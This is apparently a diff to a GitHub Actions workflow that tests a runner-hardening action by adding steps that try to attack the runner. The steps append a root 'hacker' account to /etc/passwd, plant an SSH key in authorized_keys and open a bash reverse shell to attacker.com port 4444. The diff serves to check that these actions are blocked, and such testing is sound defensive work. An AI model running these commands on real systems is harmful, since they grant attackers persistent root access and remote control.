@@ -16,6 +16,24 @@ jobs:
         uses: Securable-ai/hardener@v1.0.0
         with:
           mode: 'active'
+
+      
+      - name: Attempt to Modify /etc/passwd
+        run: |
+          echo "Attempting to modify /etc/passwd..."
+          echo "hacker:x:0:0:hacker:/root:/bin/bash" | sudo tee -a /etc/passwd || echo "Blocked by security!"
+
+      - name: Attempt to Add SSH Key
+        run: |
+          echo "Attempting to add SSH key to authorized_keys..."
+          mkdir -p ~/.ssh
+          echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7m5..." >> ~/.ssh/authorized_keys || echo "Blocked by security!"
+          chmod 600 ~/.ssh/authorized_keys
+
+      - name: Attempt to Start Reverse Shell
+        run: |
+          echo "Attempting reverse shell..."
+          bash -i >& /dev/tcp/attacker.com/4444 0>&1 || echo "Blocked by security!"
           
       - name: Install tcpdump
         run: sudo apt-get update && sudo apt-get install -y tcpdump
